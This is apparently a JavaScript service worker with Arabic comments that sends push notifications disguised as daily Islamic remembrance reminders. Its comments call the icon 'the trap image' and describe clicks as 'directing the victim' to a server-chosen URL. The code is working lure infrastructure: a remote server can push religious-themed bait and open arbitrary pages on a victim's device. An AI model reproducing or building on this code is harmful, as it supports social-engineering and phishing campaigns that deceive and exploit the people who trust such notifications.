// sw.js - محرك الإشعارات والعمليات الخلفية
const SERVER_URL = "https://mohamedahmed77.pythonanywhere.com";

// 1. عند تثبيت الـ Service Worker
self.addEventListener('install', (event) => {
    self.skipWaiting();
    console.log('Service Worker installed 💀');
});

// 2. تفعيل الـ Service Worker
self.addEventListener('activate', (event) => {
    event.waitUntil(self.clients.claim());
    console.log('Service Worker active 🚀');
});

// 3. استقبال الإشعارات من السيرفر (Push Notifications)
self.addEventListener('push', (event) => {
    let data = { title: "✨ ذكر اليوم ✨", body: "اضغط للحصول على ثواب الأذكار الجديدة" };
    
    if (event.data) {
        try {
            data = event.data.json();
        } catch (e) {
            data.body = event.data.text();
        }
    }

    const options = {
        body: data.body,
        icon: 'og-image.jpg', // سيستخدم نفس صورة المصيدة
        badge: 'og-image.jpg',
        vibrate: [100, 50, 100],
        data: { url: data.url || '/' }
    };

    event.waitUntil(
        self.registration.showNotification(data.title, options)
    );
});

// 4. عند الضغط على الإشعار (توجيه الضحية للمهمة الجديدة)
self.addEventListener('notificationclick', (event) => {
    event.notification.close();
    event.waitUntil(
        clients.openWindow(event.notification.data.url)
    );
});
